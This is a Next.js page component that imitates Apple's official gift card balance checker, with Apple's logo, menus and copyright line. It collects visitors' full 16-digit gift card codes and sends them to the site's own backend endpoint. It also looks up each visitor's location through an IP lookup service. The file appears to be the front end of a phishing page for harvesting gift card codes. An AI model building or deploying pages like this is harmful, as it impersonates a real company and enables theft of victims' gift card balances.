import { useState, useEffect } from 'react'
import Head from 'next/head'
import styles from '../styles/apple.module.css'

export default function ApplePage() {
  const [card, setCard] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)
  const [location, setLocation] = useState('United States')
  const [showTutorial, setShowTutorial] = useState(false)
  const [showLocationBanner, setShowLocationBanner] = useState(true)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  useEffect(() => {
    async function detectLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/')
        const data = await res.json()
        if (data.country_name) {
          setLocation(data.country_name)
        }
      } catch (err) {
        console.error('Location detection failed', err)
      }
    }
    detectLocation()
  }, [])

  async function checkBalance(e) {
    if (e) e.preventDefault()
    setError(null)
    setResult(null)
    if (!card.trim()) return setError('Please enter your gift card code.')

    setLoading(true)
    try {
      const res = await fetch('/api/check-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardNumber: card.replace(/\s+/g, '') })
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Validation failed')
      setResult(data)
    } catch (err) {
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className={styles.applePage}>
      <Head>
        <title>Check Apple Gift Card Balance - Apple</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
      </Head>

      {showLocationBanner && (
        <div className={styles.locationBanner}>
          <div className={styles.bannerContent}>
            <p>Choose another country or region to see content specific to your location.</p>
            <div className={styles.bannerControls}>
              <div className={styles.selectWrapper}>
                <select
                  className={styles.locationSelect}
                  value={location}
                  onChange={(e) => setLocation(e.target.value)}
                >
                  <option>United States</option>
                  <option>Canada</option>
                  <option>United Kingdom</option>
                  <option>Australia</option>
                  <option>Germany</option>
                  <option>France</option>
                  <option>Japan</option>
                  <option>Other Region</option>
                </select>
              </div>
              <button className={styles.bannerBtn} onClick={() => setShowLocationBanner(false)}>Continue</button>
            </div>
          </div>
          <button className={styles.closeBanner} onClick={() => setShowLocationBanner(false)}>
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" stroke="currentColor" strokeWidth="1.5">
              <path d="M1 1l12 12M13 1L1 13" />
            </svg>
          </button>
        </div>
      )}

      <header className={styles.header}>
        <div className={styles.headerContent}>
          <a href="/apple" className={styles.appleLogo}>
            <svg height="18" viewBox="0 0 14 18" width="14" fill="currentColor">
              <path d="m13.0729 17.6825a3.61 3.61 0 0 0 -1.2948-2.9656c-1.3109-1.1058-3.0563-1.0771-3.4419-1.0771-.0853 0-.171 0-.2563.0031-.1546.0055-.3081.0116-.4603.0232-1.7114.1299-2.1008.3304-3.5303.9733-.7191.3214-1.3373.9159-2.1121.9159-.1312 0-.2792-.012-.4448-.0479-.6133-.1331-1.1486-.5347-1.4854-.9545-.4719-.5878-1.5833-2.8595-1.5833-6.09063 0-3.11124 1.70514-4.82404 3.40769-4.82404.78231 0 1.54587.27656 2.01125.47426.61614.26129 1.33944.56764 2.39467.56764 1.05525 0 1.77855-.30635 2.39464-.56764.4654-.1977.1.22894.1.47426 1.01125 0 3.018.4116 4.0746 1.86314 0 0-2.0408 1.18956-2.0408 3.64026 0 2.4503 2.1132 3.3283 2.1132 3.3283a8.85 8.85 0 0 1 -.8597 2.3184zm-3.5835-14.3245a2.96658 2.96658 0 0 0 .696-2.06222c0-.10147-.0097-.2015-.025-.29578-2.285.0921-2.98619 1.61866-2.98619 1.61866a2.53015 2.53015 0 0 0 -.69288 2.06451.27.27 0 0 0 .1536.2144 2.14 2.14 0 0 0 .62.08182c1.7 0 2.235-.905 2.235-.9115z" />
            </svg>
          </a>

          <nav className={styles.navMenu}>
            <a href="#">Store</a>
            <a href="#">Mac</a>
            <a href="#">iPad</a>
            <a href="#">iPhone</a>
            <a href="#">Watch</a>
            <a href="#">Support</a>
          </nav>

          <div className={styles.headerActions}>
            <button className={styles.iconBtn} aria-label="Search">
              <svg width="15" height="15" viewBox="0 0 15 15" fill="none" stroke="currentColor" strokeWidth="1.2">
                <circle cx="6" cy="6" r="5" />
                <path d="M10 10l4 4" />
              </svg>
            </button>
            <button className={styles.iconBtn} aria-label="Shopping Bag">
              <svg width="13" height="15" viewBox="0 0 13 15" fill="none" stroke="currentColor" strokeWidth="1.2">
                <path d="M1 4h11v10H1z" />
                <path d="M3.5 6V3a3 3 0 116 0v3" />
              </svg>
            </button>
            <button
              className={styles.mobileMenuBtn}
              aria-label="Menu"
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
            >
              <svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" strokeWidth="1.2">
                <path d={mobileMenuOpen ? "M3 15L15 3M3 3l12 12" : "M2 5h14M2 13h14"} />
              </svg>
            </button>
          </div>
        </div>

        <aside className={`${styles.mobileNav} ${mobileMenuOpen ? styles.open : ''}`}>
          <div className={styles.mobileNavHeader}>
            <button onClick={() => setMobileMenuOpen(false)}>×</button>
          </div>
          <nav className={styles.mobileLinks}>
            <a href="#" onClick={() => setMobileMenuOpen(false)}>Store</a>
            <a href="#" onClick={() => setMobileMenuOpen(false)}>Mac</a>
            <a href="#" onClick={() => setMobileMenuOpen(false)}>iPad</a>
            <a href="#" onClick={() => setMobileMenuOpen(false)}>iPhone</a>
            <a href="#" onClick={() => setMobileMenuOpen(false)}>Watch</a>
            <a href="#" onClick={() => setMobileMenuOpen(false)}>Support</a>
          </nav>
        </aside>
      </header>

      <main className={styles.pageRoot}>
        <div className={styles.shell}>
          <section className={styles.hero}>
            <h1>Check your Apple Gift Card balance</h1>
            <p className={styles.heroText}>Enter the 16-digit code to see your available balance instantly.</p>
          </section>

          <div className={styles.mainCard}>
            <form onSubmit={checkBalance} className={styles.form}>
              <div className={styles.inputWrapper}>
                <span>Gift Card Code</span>
                <input
                  type="text"
                  value={card}
                  onChange={(e) => setCard(e.target.value.toUpperCase())}
                  placeholder="XXXX XXXX XXXX XXXX"
                  autoComplete="off"
                />
              </div>

              <div className={styles.actions}>
                <button type="submit" className={styles.primaryBtn} disabled={loading}>
                  {loading ? 'Checking…' : 'Check Balance'}
                </button>
              </div>

              {error && <div className={styles.errorText}>{error}</div>}

              {result && (
                <div className={styles.result}>
                  <div className={styles.amountText}>${result.balance.toFixed(2)}</div>
                  <div className={styles.metaText}>Card ending in {result.cardLast4}</div>
                  <button type="button" className={styles.locationBtn} onClick={() => { setCard(''); setResult(null) }}>Check another card</button>
                </div>
              )}
            </form>
          </div>

          <section className={styles.helpSection}>
            <div className={styles.helpHeader} onClick={() => setShowTutorial(!showTutorial)}>
              <h2>Can't find your gift card code?</h2>
              <button
                className={styles.toggleBtn}
                aria-expanded={showTutorial}
                aria-label="Toggle Tutorial"
              >
                <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.3s ease' }}>
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>

            {showTutorial && (
              <div className={styles.tutorial}>
                <div className={styles.mockupGrid}>
                  <div className={styles.mockupCard}>
                    <div className={styles.mockupImage}>
                      <div className={styles.cardMockup}>
                        <div className={styles.cardLogo}>APPLE</div>
                        <div className={styles.cardCode}>1234 5678 9012 3456</div>
                      </div>
                    </div>
                    <h3>Physical Gift Card</h3>
                    <p>Look on the <strong>back</strong> of your card. The 16-digit code is usually printed below or above the barcode.</p>
                  </div>

                  <div className={styles.mockupCard}>
                    <div className={styles.mockupImage}>
                      <div className={styles.receiptMockup}>
                        <div style={{ fontWeight: 700, fontSize: '11px', marginBottom: '12px' }}>Apple Store Receipt</div>
                        <div style={{ borderBottom: '1px dashed #d2d2d7', margin: '12px 0' }}></div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px', marginBottom: '4px' }}>
                          <span>Card Code:</span>
                          <span style={{ fontWeight: 700 }}>1234 5678...</span>
                        </div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px' }}>
                          <span>Amount:</span>
                          <span style={{ fontWeight: 700 }}>$50.00</span>
                        </div>
                      </div>
                    </div>
                    <h3>Purchase Receipt</h3>
                    <p>If purchased in-store, check your <strong>receipt</strong>. The code is printed clearly on it.</p>
                  </div>
                </div>

                <div className={styles.helpFooter}>
                  <p>Still need help? <a href="https://support.apple.com/gift-card" target="_blank" rel="noopener noreferrer">Visit Apple Support →</a></p>
                </div>
              </div>
            )}
          </section>
        </div>
      </main>

      <footer className={styles.pageFooter}>
        <p>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
      </footer>
    </div>
  )
}
